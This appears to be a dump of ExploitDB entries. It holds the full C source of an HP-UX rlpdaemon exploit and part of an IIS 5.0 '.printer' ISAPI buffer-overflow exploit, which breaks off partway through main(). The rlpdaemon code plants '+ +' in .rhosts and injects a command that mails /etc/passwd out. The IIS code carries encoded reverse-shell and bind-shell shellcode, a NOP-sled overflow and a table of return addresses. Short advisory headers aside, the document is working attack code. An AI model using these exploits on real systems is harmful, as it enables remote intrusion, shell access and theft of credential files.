{u'code': u'/*\r\nsource: http://www.securityfocus.com/bid/150/info\r\n\r\nA number of vulnerabilities exist in Hewlett Packard\'s rlpdaemon under HPUX 9.x and 10.x. These vulnerabilities may allow for a remote attacker to access the system under the lp user account, as well as execute arbitrary commands remotely, also as user lp.\r\n\r\nThere are three vulnerabilities: (culled from RSI Advisory RSI.0006.06-25-98.HP-UX.RLPDAEMON) \r\n\r\n#1: The argument in the Unlink Data File section of the control file gets passed to /bin/rm by a system () call. This argument should normally be a filename, however, a semi-colon and an arbitrary command can be appended allowing you to execute commands as user lp.\r\n\r\n#2: When the client passes a file to the rlpdaemon, no sanity checks are performed to ensure the validity of the filename. This allows for a remote attacker to send any file s/he wants and have it stored in the user lp\'s home directory.\r\n\r\n#3: The rlpdaemon will allow remote connections from any source port. This violates the lpd behavior recommended in RFC-1179 which explicitly states that only source ports of 721-731 should be allowed to access the daemon.\r\n*/\r\n\r\n/*** lpd-mail.c\r\n**\r\n** Experiments with the BSD-style \'lpd\' protocol.\r\n** Gus \'98\r\n**\r\n** Modified by Gamma to support sending "Mail When Printed". Use\r\n** in conjunction with lpd-touch.\r\n**\r\n** Notes: Potential exploitation of lpd by specifying alternate\r\n**        sendmail alias file to use etc.  However, there areseveral\r\n**        problems which come up to hinder progress.  Here is\r\n**        not the place to go into details, have a play around\r\n**        yourself.\r\n**\r\n**        Eg. ./lpd-mail localhost lp "-oA/var/spool/lpd/x" .\r\n**\r\n**        Will attempt to use /var/spool/lpd/x@..db as an alternative\r\n**        alias file.  Downfall is you are unable to specify a\r\n**        recipiant to pass to sendmail, it gets ran as uid 1 and\r\n**        cannot write to /var/spool/mqueue.  YMMV though depending\r\n**        on the version of Sendmail running.  Multiple versions\r\n**        of Sendmail always drops setuid though so no matter what\r\n**        alternate alias, sendmail.cf file you pass it, problems will\r\n**        arise when it comes to writing to /var/spool/mqueue.\r\n**\r\n** References: RFC-1179\r\n**\r\n** Greets: Gus for lpd-rm, pr0pane for mad discussions, Ao12M, #phuk\r\n**\r\n** lpd-mail.c Send mail when print job has finished\r\n** Usage: ./lpd-mail <target> <printer> <user> <userhost>          */\r\n\r\n\r\n\r\n\r\n/*\r\nThis program is re-written by LigerTeam\r\n\r\nUnpublished hp-ux rlpdaemon exploit of LigerTeam\r\n\r\nSecurity LigerTeam\r\nhomepage   : http://liger.fnetwork.com\r\nContact Us : ligerteam@hotmail.com\r\n\r\nWrote rlpdaemon exploit in 1999.?.?\r\n\r\nYou can get original information at http://www.repsec.com about it.\r\nand  http://www.securityfocus.com/vdb/bottom.html?vid=150\r\n\r\nNote:\r\ndon\'t use hacking\r\n\r\n*/\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <fcntl.h>\r\n#include <sys/socket.h>\r\n#include <sys/types.h>\r\n#include <netinet/in.h>\r\n#include <netdb.h>\r\n#include <errno.h>\r\n#include<arpa/inet.h>\r\n/* Control codes for commands.           No spaces unless specified  */\r\n#define LPD_RECIEVE_JOB \'\\2\'           /* \\2 printername <lf> */\r\n#define CMD_RECIEVE_CONTROL_FILE \'\\2\'  /* \\2 size <space> name <lf> */\r\n#define CMD_RECIEVE_DATA_FILE \'\\3\'     /* \\3 size <space> name <lf> */\r\n#define CMD_CLASSNAME \'C\'              /* C classname <lf> */\r\n#define CMD_HOSTNAME \'H\'               /* H hostname <lf> */\r\n#define CMD_JOBNAME \'J\'                /* J jobname <lf> */\r\n#define CMD_PRINTBANNERPAGE \'L\'        /* L username <lf */\r\n#define CMD_MAIL_WHEN_PRINTED \'M\'\r\n\r\n/* M username@host <lf> */\r\n#define CMD_SOURCEFILENAME \'N\'      /* N filename <lf> */\r\n#define CMD_USERNAME \'P\'            /* P user-requesting-job <lf> */\r\n#define CMD_UNLINK \'U\'              /* U filename <lf> */\r\n#define CMD_PRINTFORMATTEDFILE \'f\'  /* f Filename of pre-formatted text*/\r\n\r\nvoid usage(char *);\r\nint doit(int ,char *,char *, char *, char *);\r\nint openhost (char *);\r\n\r\n\r\nint main (int argc, char*argv[]) {\r\n\r\n  int port,sock;\r\n  char *target,*printer,*user,*userhost;\r\n\r\n  port = 0;\r\n  target = printer = user = userhost = NULL;\r\n\r\n  fprintf(stderr,"\'lpd-mail.c\' - Gus\'98 with mods by Gamma\\n");\r\n  if (argc < 5) usage(argv[0]);\r\n\r\n  printf("Start !!!!!!!!!!!!\\n");\r\n  target = argv[1];\r\n  printer = argv[2];\r\n  user = argv[3];\r\n  userhost = argv[4];\r\n  if ((sock = openhost(target)) > 0) {\r\n    exit(doit(sock,printer,target,user,userhost));\r\n  } else {\r\n    exit(sock);\r\n  }\r\n}\r\n\r\n\r\nint openhost (char *target) {\r\n\r\n  int sock;\r\n  struct hostent *he;\r\n  struct sockaddr_in sa;\r\n  int localport;\r\n\r\n/*  he=gethostbyname(target);\r\n  if(he==NULL) {\r\n    fprintf(stderr,"Bad hostname");\r\n    return (-1);\r\n  }*/\r\n\r\n\r\n  /* According to the RFC, the source port must be in the range\r\n   of 721-731 inclusive. */\r\n\r\n/*  srand(getpid());\r\n  localport = 721 + (int) (10.0*rand()/(RAND_MAX+1.0));\r\n*/\r\n\r\n  sock=socket(AF_INET,SOCK_STREAM,0);\r\n\r\n/* sa.sin_addr.s_addr=INADDR_ANY;  */\r\n  sa.sin_family=AF_INET;\r\n/* sa.sin_port=htons(localport);\r\n\r\n  bind(sock,(struct sockaddr *)&sa,sizeof(sa));*/\r\n  sa.sin_port=htons(515);\r\n  sa.sin_addr.s_addr=inet_addr(target);\r\n/* memcpy(&sa.sin_addr,he->h_addr,he->h_length); */\r\n  if(connect(sock,(struct sockaddr *)&sa,sizeof(sa)) < 0) {\r\n    perror("Can\'t connect");\r\n    return (-1);\r\n  } else {\r\n    fcntl(sock,F_SETFL,O_NONBLOCK);\r\n  }\r\n  printf("Source port: %d  : Connected...\\n",localport);\r\n  return(sock);\r\n}\r\n\r\n\r\n\r\nint doit(int sock,char *printer,char *target, char *user, char *userhost){\r\n\r\n  char hello[255];\r\n  char sendbuf[1024];\r\n  char respbuf[255];\r\n  int readn;\r\n  /* Hello Mr LPD. Can I print to <printer> please ? */\r\n  sprintf(sendbuf,"%c%s\\n",LPD_RECIEVE_JOB,printer);\r\n  if ((write(sock,sendbuf,strlen(sendbuf)) != (strlen(printer)+2))) {\r\n    perror("1 write");\r\n  }\r\n\r\n  /* Why yes young man, what would you like me to do ? */\r\n  readn=read(sock,respbuf,255);\r\n   printf(": %s i read%d\\n",respbuf,readn);\r\n\r\n\r\n  /*  Would you be so kind as to carry out the commands in this file\r\n   *  as superuser without giving up any priviledges please ?\r\n   */\r\n/*  sprintf(sendbuf,"%c%s\\n%croot\\n%cmyjobname\\n%c%s\\n%croot\\n%c%s\\n%cdfA\r\n                     \\n%c;/bin/mail guest@localhost </etc/passwd\\n\r\n                     %c/var/spool/lp/.rhosts",\r\n          CMD_HOSTNAME,\r\n          userhost,\r\n          CMD_USERNAME,\r\n          CMD_JOBNAME,\r\n          CMD_CLASSNAME,\r\n          target,\r\n          CMD_PRINTBANNERPAGE,\r\n          CMD_MAIL_WHEN_PRINTED,\r\n          user,\r\n          CMD_PRINTFORMATTEDFILE,CMD_UNLINK,CMD_SOURCEFILENAME);\r\n    */\r\n  /* But of course young feller me lad! Security is for girls! */\r\n\r\n  /*sprintf(hello,"%c%d cfA13\\n",\r\n          CMD_RECIEVE_CONTROL_FILE,strlen(sendbuf));\r\n  printf("Sent hello.\\n");\r\n  if (write(sock,hello,strlen(hello)) != strlen(hello)) perror("2 write");\r\n  if (write(sock,sendbuf,strlen(sendbuf)+1) != (strlen(sendbuf)+1)) {\r\n    perror("3 write");\r\n  } */\r\n  printf("Sent command set.\\n");\r\n  /*read(sock,respbuf,256);*/\r\n\r\nstrcat(sendbuf,"+ +");\r\nsprintf(hello,"%c%d ../../.rhosts\\n", \r\nCMD_RECIEVE_DATA_FILE,strlen(sendbuf));\r\n\r\n\r\n   printf(" send data file \\n");\r\nif ( write(sock,hello,strlen(hello)) !=strlen(hello)) perror("3 write");\r\nif ( write(sock,sendbuf,strlen(sendbuf)+1) != ( strlen(sendbuf) + 1 )) {\r\n      perror("3 write ");\r\n}\r\nsprintf(sendbuf,"%c%s\\n%croot\\n%cmyjobname\\n%c%s\\n%croot\\n%c%s\\n%c..\r\n      \\n%c;/bin/mail guest@localhost </etc/passwd\\n\r\n                  %c../../.rhosts",\r\n                  CMD_HOSTNAME,\r\n                  userhost,\r\n                  CMD_USERNAME,\r\n                  CMD_JOBNAME,\r\n                  CMD_CLASSNAME,\r\n                  target,\r\n                  CMD_PRINTBANNERPAGE,\r\n                  CMD_MAIL_WHEN_PRINTED,\r\n                  user,\r\n                  CMD_PRINTFORMATTEDFILE,CMD_UNLINK,CMD_SOURCEFILENAME);\r\nprintf(" making send buf \\n");\r\n\r\n\r\nsprintf(hello,"%c%d cfA16\\n",CMD_RECIEVE_CONTROL_FILE,strlen(sendbuf));\r\nprintf("send control file \\n");\r\nif ( write(sock,hello,strlen(hello)) != strlen(hello)) perror("2 write\\n");\r\nif  ( write(sock,sendbuf,strlen(sendbuf)+1) != (strlen(sendbuf) +1)) {\r\nperror("3 write \\n");\r\n         }\r\n\r\n    read(sock,respbuf,256);\r\n    sleep(3);\r\n    shutdown(sock,2);\r\n\r\n  return (0);\r\n}\r\n\r\n\r\nvoid usage (char *name) {\r\n  fprintf(stderr,"Usage: %s <target> <printer> <user> <userhost>\\n",name);\r\n  exit(1);\r\n}\r\n-----------------------------------------------------------------------------\r\n- The Security LigerTeam 2000 KOREA -', u'description': u'HP HP-UX 10.34 rlpdaemon - Remote Overflow', u'platform': u'linux', u'author': u'RSI Advise', u'cve': [], u'source': u'ExploitDB', u'date': u'1998-07-06T00:00:00+00:00', u'_id': 19119, u'type': u'remote', u'port': 0}

CVE: []
Description: Microsoft IIS 5.0 - '.printer' ISAPI Extension Buffer Overflow (2)
{u'code': u'source: http://www.securityfocus.com/bid/2674/info\r\n \r\nWindows 2000 Internet printing ISAPI extension contains msw3prt.dll which handles user requests. Due to an unchecked buffer in msw3prt.dll, a maliciously crafted HTTP .printer request containing approx 420 bytes in the \'Host:\' field will allow the execution of arbitrary code. Typically a web server would stop responding in a buffer overflow condition; however, once Windows 2000 detects an unresponsive web server it automatically performs a restart. Therefore, the administrator will be unaware of this attack.\r\n \r\n* If Web-based Printing has been configured in group policy, attempts to disable or unmap the affected extension via Internet Services Manager will be overridden by the group policy settings. \r\n\r\n*/\r\n//---------------------------sol2k.c--------------------------------\r\n#ifdef _WIN32\r\n#include <Winsock2.h>\r\n#include <Windows.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#define snprintf _snprintf\r\n#else\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n#include <netdb.h>\r\n#endif\r\n#include <stdio.h>\r\n#include <string.h>\r\n#include <fcntl.h>\r\n\r\nunsigned long *ret[20];\r\nunsigned char send_buf[2000];\r\nunsigned char request[]=\r\n"\\x47\\x45\\x54\\x20\\x2f\\x4e\\x55\\x4c\\x4c\\x2e\\x70\\x72\\x69\\x6e\\x74\\x65\\x72\\x20"\r\n"\\x48\\x54\\x54\\x50\\x2f\\x31\\x2e\\x30\\x0d\\x0a";\r\nunsigned char revers_shell[]=\r\n"\\x42\\x65\\x61\\x76\\x75\\x68\\x3a\\x20\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n"\\x90\\x90\\xeb\\x03\\x5d\\xeb\\x05\\xe8\\xf8\\xff\\xff\\xff\\x83\\xc5\\x15\\x90\\x90\\x90"\r\n"\\x8b\\xc5\\x33\\xc9\\x66\\xb9\\xd7\\x02\\x50\\x80\\x30\\x95\\x40\\xe2\\xfa\\x2d\\x95\\x95"\r\n"\\x64\\xe2\\x14\\xad\\xd8\\xcf\\x05\\x95\\xe1\\x96\\xdd\\x7e\\x60\\x7d\\x95\\x95\\x95\\x95"\r\n"\\xc8\\x1e\\x40\\x14\\x7f\\x9a\\x6b\\x6a\\x6a\\x1e\\x4d\\x1e\\xe6\\xa9\\x96\\x66\\x1e\\xe3"\r\n"\\xed\\x96\\x66\\x1e\\xeb\\xb5\\x96\\x6e\\x1e\\xdb\\x81\\xa6\\x78\\xc3\\xc2\\xc4\\x1e\\xaa"\r\n"\\x96\\x6e\\x1e\\x67\\x2c\\x9b\\x95\\x95\\x95\\x66\\x33\\xe1\\x9d\\xcc\\xca\\x16\\x52\\x91"\r\n"\\xd0\\x77\\x72\\xcc\\xca\\xcb\\x1e\\x58\\x1e\\xd3\\xb1\\x96\\x56\\x44\\x74\\x96\\x54\\xa6"\r\n"\\x5c\\xf3\\x1e\\x9d\\x1e\\xd3\\x89\\x96\\x56\\x54\\x74\\x97\\x96\\x54\\x1e\\x95\\x96\\x56"\r\n"\\x1e\\x67\\x1e\\x6b\\x1e\\x45\\x2c\\x9e\\x95\\x95\\x95\\x7d\\xe1\\x94\\x95\\x95\\xa6\\x55"\r\n"\\x39\\x10\\x55\\xe0\\x6c\\xc7\\xc3\\x6a\\xc2\\x41\\xcf\\x1e\\x4d\\x2c\\x93\\x95\\x95\\x95"\r\n"\\x7d\\xce\\x94\\x95\\x95\\x52\\xd2\\xf1\\x99\\x95\\x95\\x95\\x52\\xd2\\xfd\\x95\\x95\\x95"\r\n"\\x95\\x52\\xd2\\xf9\\x94\\x95\\x95\\x95\\xff\\x95\\x18\\xd2\\xf1\\xc5\\x18\\xd2\\x85\\xc5"\r\n"\\x18\\xd2\\x81\\xc5\\x6a\\xc2\\x55\\xff\\x95\\x18\\xd2\\xf1\\xc5\\x18\\xd2\\x8d\\xc5\\x18"\r\n"\\xd2\\x89\\xc5\\x6a\\xc2\\x55\\x52\\xd2\\xb5\\xd1\\x95\\x95\\x95\\x18\\xd2\\xb5\\xc5\\x6a"\r\n"\\xc2\\x51\\x1e\\xd2\\x85\\x1c\\xd2\\xc9\\x1c\\xd2\\xf5\\x1e\\xd2\\x89\\x1c\\xd2\\xcd\\x14"\r\n"\\xda\\xd9\\x94\\x94\\x95\\x95\\xf3\\x52\\xd2\\xc5\\x95\\x95\\x18\\xd2\\xe5\\xc5\\x18\\xd2"\r\n"\\xb5\\xc5\\xa6\\x55\\xc5\\xc5\\xc5\\xff\\x94\\xc5\\xc5\\x7d\\x95\\x95\\x95\\x95\\xc8\\x14"\r\n"\\x78\\xd5\\x6b\\x6a\\x6a\\xc0\\xc5\\x6a\\xc2\\x5d\\x6a\\xe2\\x85\\x6a\\xc2\\x71\\x6a\\xe2"\r\n"\\x89\\x6a\\xc2\\x71\\xfd\\x95\\x91\\x95\\x95\\xff\\xd5\\x6a\\xc2\\x45\\x1e\\x7d\\xc5\\xfd"\r\n"\\x94\\x94\\x95\\x95\\x6a\\xc2\\x7d\\x10\\x55\\x9a\\x10\\x3f\\x95\\x95\\x95\\xa6\\x55\\xc5"\r\n"\\xd5\\xc5\\xd5\\xc5\\x6a\\xc2\\x79\\x16\\x6d\\x6a\\x9a\\x11\\x02\\x95\\x95\\x95\\x1e\\x4d"\r\n"\\xf3\\x52\\x92\\x97\\x95\\xf3\\x52\\xd2\\x97\\x8e\\xac\\x52\\xd2\\x91\\x5e\\x38\\x4c\\xb3"\r\n"\\xff\\x85\\x18\\x92\\xc5\\xc6\\x6a\\xc2\\x61\\xff\\xa7\\x6a\\xc2\\x49\\xa6\\x5c\\xc4\\xc3"\r\n"\\xc4\\xc4\\xc4\\x6a\\xe2\\x81\\x6a\\xc2\\x59\\x10\\x55\\xe1\\xf5\\x05\\x05\\x05\\x05\\x15"\r\n"\\xab\\x95\\xe1\\xba\\x05\\x05\\x05\\x05\\xff\\x95\\xc3\\xfd\\x95\\x91\\x95\\x95\\xc0\\x6a"\r\n"\\xe2\\x81\\x6a\\xc2\\x4d\\x10\\x55\\xe1\\xd5\\x05\\x05\\x05\\x05\\xff\\x95\\x6a\\xa3\\xc0"\r\n"\\xc6\\x6a\\xc2\\x6d\\x16\\x6d\\x6a\\xe1\\xbb\\x05\\x05\\x05\\x05\\x7e\\x27\\xff\\x95\\xfd"\r\n"\\x95\\x91\\x95\\x95\\xc0\\xc6\\x6a\\xc2\\x69\\x10\\x55\\xe9\\x8d\\x05\\x05\\x05\\x05\\xe1"\r\n"\\x09\\xff\\x95\\xc3\\xc5\\xc0\\x6a\\xe2\\x8d\\x6a\\xc2\\x41\\xff\\xa7\\x6a\\xc2\\x49\\x7e"\r\n"\\x1f\\xc6\\x6a\\xc2\\x65\\xff\\x95\\x6a\\xc2\\x75\\xa6\\x55\\x39\\x10\\x55\\xe0\\x6c\\xc4"\r\n"\\xc7\\xc3\\xc6\\x6a\\x47\\xcf\\xcc\\x3e\\x77\\x7b\\x56\\xd2\\xf0\\xe1\\xc5\\xe7\\xfa\\xf6"\r\n"\\xd4\\xf1\\xf1\\xe7\\xf0\\xe6\\xe6\\x95\\xd9\\xfa\\xf4\\xf1\\xd9\\xfc\\xf7\\xe7\\xf4\\xe7"\r\n"\\xec\\xd4\\x95\\xd6\\xe7\\xf0\\xf4\\xe1\\xf0\\xc5\\xfc\\xe5\\xf0\\x95\\xd2\\xf0\\xe1\\xc6"\r\n"\\xe1\\xf4\\xe7\\xe1\\xe0\\xe5\\xdc\\xfb\\xf3\\xfa\\xd4\\x95\\xd6\\xe7\\xf0\\xf4\\xe1\\xf0"\r\n"\\xc5\\xe7\\xfa\\xf6\\xf0\\xe6\\xe6\\xd4\\x95\\xc5\\xf0\\xf0\\xfe\\xdb\\xf4\\xf8\\xf0\\xf1"\r\n"\\xc5\\xfc\\xe5\\xf0\\x95\\xd2\\xf9\\xfa\\xf7\\xf4\\xf9\\xd4\\xf9\\xf9\\xfa\\xf6\\x95\\xc2"\r\n"\\xe7\\xfc\\xe1\\xf0\\xd3\\xfc\\xf9\\xf0\\x95\\xc7\\xf0\\xf4\\xf1\\xd3\\xfc\\xf9\\xf0\\x95"\r\n"\\xc6\\xf9\\xf0\\xf0\\xe5\\x95\\xd0\\xed\\xfc\\xe1\\xc5\\xe7\\xfa\\xf6\\xf0\\xe6\\xe6\\x95"\r\n"\\xd6\\xf9\\xfa\\xe6\\xf0\\xdd\\xf4\\xfb\\xf1\\xf9\\xf0\\x95\\xc2\\xc6\\xda\\xd6\\xde\\xa6"\r\n"\\xa7\\x95\\xc2\\xc6\\xd4\\xc6\\xe1\\xf4\\xe7\\xe1\\xe0\\xe5\\x95\\xe6\\xfa\\xf6\\xfe\\xf0"\r\n"\\xe1\\x95\\xf6\\xf9\\xfa\\xe6\\xf0\\xe6\\xfa\\xf6\\xfe\\xf0\\xe1\\x95\\xf6\\xfa\\xfb\\xfb"\r\n"\\xf0\\xf6\\xe1\\x95\\xe6\\xf0\\xfb\\xf1\\x95\\xe7\\xf0\\xf6\\xe3\\x95\\xf6\\xf8\\xf1\\xbb"\r\n"\\xf0\\xed\\xf0\\x95\\x0d\\x0a";\r\n//FlashSky/Benjurry and, H D Moore\'s code\r\nunsigned char shell[]=\r\n"\\x42\\x65\\x61\\x76\\x75\\x68\\x3a\\x20\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\xeb\\x19\\x5e\\x31\\xc9\\x81\\xe9\\x89\\xff"\r\n"\\xff\\xff\\x81\\x36\\x80\\xbf\\x32\\x94\\x81\\xee\\xfc\\xff\\xff\\xff\\xe2\\xf2"\r\n"\\xeb\\x05\\xe8\\xe2\\xff\\xff\\xff\\x03\\x53\\x06\\x1f\\x74\\x57\\x75\\x95\\x80"\r\n"\\xbf\\xbb\\x92\\x7f\\x89\\x5a\\x1a\\xce\\xb1\\xde\\x7c\\xe1\\xbe\\x32\\x94\\x09"\r\n"\\xf9\\x3a\\x6b\\xb6\\xd7\\x9f\\x4d\\x85\\x71\\xda\\xc6\\x81\\xbf\\x32\\x1d\\xc6"\r\n"\\xb3\\x5a\\xf8\\xec\\xbf\\x32\\xfc\\xb3\\x8d\\x1c\\xf0\\xe8\\xc8\\x41\\xa6\\xdf"\r\n"\\xeb\\xcd\\xc2\\x88\\x36\\x74\\x90\\x7f\\x89\\x5a\\xe6\\x7e\\x0c\\x24\\x7c\\xad"\r\n"\\xbe\\x32\\x94\\x09\\xf9\\x22\\x6b\\xb6\\xd7\\x4c\\x4c\\x62\\xcc\\xda\\x8a\\x81"\r\n"\\xbf\\x32\\x1d\\xc6\\xab\\xcd\\xe2\\x84\\xd7\\xf9\\x79\\x7c\\x84\\xda\\x9a\\x81"\r\n"\\xbf\\x32\\x1d\\xc6\\xa7\\xcd\\xe2\\x84\\xd7\\xeb\\x9d\\x75\\x12\\xda\\x6a\\x80"\r\n"\\xbf\\x32\\x1d\\xc6\\xa3\\xcd\\xe2\\x84\\xd7\\x96\\x8e\\xf0\\x78\\xda\\x7a\\x80"\r\n"\\xbf\\x32\\x1d\\xc6\\x9f\\xcd\\xe2\\x84\\xd7\\x96\\x39\\xae\\x56\\xda\\x4a\\x80"\r\n"\\xbf\\x32\\x1d\\xc6\\x9b\\xcd\\xe2\\x84\\xd7\\xd7\\xdd\\x06\\xf6\\xda\\x5a\\x80"\r\n"\\xbf\\x32\\x1d\\xc6\\x97\\xcd\\xe2\\x84\\xd7\\xd5\\xed\\x46\\xc6\\xda\\x2a\\x80"\r\n"\\xbf\\x32\\x1d\\xc6\\x93\\x01\\x6b\\x01\\x53\\xa2\\x95\\x80\\xbf\\x66\\xfc\\x81"\r\n"\\xbe\\x32\\x94\\x7f\\xe9\\x2a\\xc4\\xd0\\xef\\x62\\xd4\\xd0\\xff\\x62\\x6b\\xd6"\r\n"\\xa3\\xb9\\x4c\\xd7\\xe8\\x5a\\x96\\x80\\xae\\x6e\\x1f\\x4c\\xd5\\x24\\xc5\\xd3"\r\n"\\x40\\x64\\xb4\\xd7\\xec\\xcd\\xc2\\xa4\\xe8\\x63\\xc7\\x7f\\xe9\\x1a\\x1f\\x50"\r\n"\\xd7\\x57\\xec\\xe5\\xbf\\x5a\\xf7\\xed\\xdb\\x1c\\x1d\\xe6\\x8f\\xb1\\x78\\xd4"\r\n"\\x32\\x0e\\xb0\\xb3\\x7f\\x01\\x5d\\x03\\x7e\\x27\\x3f\\x62\\x42\\xf4\\xd0\\xa4"\r\n"\\xaf\\x76\\x6a\\xc4\\x9b\\x0f\\x1d\\xd4\\x9b\\x7a\\x1d\\xd4\\x9b\\x7e\\x1d\\xd4"\r\n"\\x9b\\x62\\x19\\xc4\\x9b\\x22\\xc0\\xd0\\xee\\x63\\xc5\\xea\\xbe\\x63\\xc5\\x7f"\r\n"\\xc9\\x02\\xc5\\x7f\\xe9\\x22\\x1f\\x4c\\xd5\\xcd\\x6b\\xb1\\x40\\x64\\x98\\x0b"\r\n"\\x77\\x65\\x6b\\xd6\\x93\\xcd\\xc2\\x94\\xea\\x64\\xf0\\x21\\x8f\\x32\\x94\\x80"\r\n"\\x3a\\xf2\\xec\\x8c\\x34\\x72\\x98\\x0b\\xcf\\x2e\\x39\\x0b\\xd7\\x3a\\x7f\\x89"\r\n"\\x34\\x72\\xa0\\x0b\\x17\\x8a\\x94\\x80\\xbf\\xb9\\x51\\xde\\xe2\\xf0\\x90\\x80"\r\n"\\xec\\x67\\xc2\\xd7\\x34\\x5e\\xb0\\x98\\x34\\x77\\xa8\\x0b\\xeb\\x37\\xec\\x83"\r\n"\\x6a\\xb9\\xde\\x98\\x34\\x68\\xb4\\x83\\x62\\xd1\\xa6\\xc9\\x34\\x06\\x1f\\x83"\r\n"\\x4a\\x01\\x6b\\x7c\\x8c\\xf2\\x38\\xba\\x7b\\x46\\x93\\x41\\x70\\x3f\\x97\\x78"\r\n"\\x54\\xc0\\xaf\\xfc\\x9b\\x26\\xe1\\x61\\x34\\x68\\xb0\\x83\\x62\\x54\\x1f\\x8c"\r\n"\\xf4\\xb9\\xce\\x9c\\xbc\\xef\\x1f\\x84\\x34\\x31\\x51\\x6b\\xbd\\x01\\x54\\x0b"\r\n"\\x6a\\x6d\\xca\\xdd\\xe4\\xf0\\x90\\x80\\x2f\\xa2\\x04\\x0d\\x0a";\r\nunsigned char overflow[]=\r\n"\\x48\\x6f\\x73\\x74\\x3a\\x20\\x90\\x90\\x90\\x90\\x90\\x90"\r\n"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"\r\n"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x33"\r\n"\\xc0\\xb0\\x90\\x03\\xd8\\x8b\\x03\\x8b\\x40\\x60\\x33\\xdb\\xb3\\x24\\x03\\xc3\\xff\\xe0"\r\n"\\xeb\\xb9\\x90\\x90\\x41\\x41\\x41\\x41\\x0d\\x0a\\x0d\\x0a";\r\nunsigned short lportl=666; /* drg */\r\nchar lport[4] = "\\x00\\xFF\\xFF\\x8b"; /* drg */\r\n        int z=0;\r\n        int                     s;\r\n        unsigned short int      a_port;\r\n        unsigned long           a_host;\r\n        struct hostent          *ht;\r\n        struct sockaddr_in      sin;\r\n        #ifdef _WIN32\r\n        WORD werd;\r\n        WSADATA wsd;\r\n\r\n        #endif\r\nint main(int argc, char *argv[]){\r\n//call ebx values in msw3prt.dll\r\nret[0] = 0x6A8C3105;\r\nret[1] = 0x6A8C317F;\r\nret[2] = 0x6A8C3267;\r\nret[3] = 0x6A8C32AD;\r\nret[4] = 0x6A8C3DB9;\r\nret[5] = 0x6A8C3DC2;\r\nret[6] = 0x6A8C3E23;\r\nret[7] = 0x6A8C4D88;\r\nret[8] = 0x6A8C4DD1;\r\nret[9] = 0x6A8C4DFB;\r\nret[10] = 0x6A8C5383;\r\nret[11] = 0x6A8C5395;\r\nret[12] = 0x6A8C565D;\r\nret[13] = 0x6A8C6437;\r\nret[14] = 0x6A8C6451;\r\nret[15] = 0x6A8C66C2;\r\nret[16] = 0x6A8C66FB;\r\nret[17] = 0x6A8C6B04;\r\nret[18] = 0x6A8C6B1D;\r\nret[19] = 0x6A8C73A4;\r\nret[20] = 0x6A8C73D8;\r\nret[21] = 0x6A8C73F4;\r\nret[22] = 0x6A8C9C55;\r\nret[23] = 0x6A8C9C86;\r\nret[24] = 0x6A8CCF13;\r\nret[25] = 0x6A8CCF4B;\r\nret[26] = 0x6A8CCF62;\r\n        #ifdef _WIN32\r\n        werd= MAKEWORD(2,0);\r\n        WSAStartup(werd,&wsd);\r\n        #endif\r\n        printf("iis5 remote .printer overflow.\\n"\r\n                "dark spyrit <dspyrit@beavuh.org> / beavuh labs.\\n"\r\n                "Updated by sectroyer the member of Random Intruders\\n");\r\n\r\nif (argc < 3){\r\n        printf("usage: %s 0 <vicHost> <vicPort> <atckHost> <atckPort> [<ret 1-26>]\\nOr: %s 1 <vicHost> [<shellPort>] [<vicPort>] [<ret 1-26>]\\n",argv[0],argv[0]);\r\n        exit(1);\r\n         }\r\nif (argc >= 3){\r\n        if(!atoi(argv[1]) && argc < 6)\r\n        {\r\n        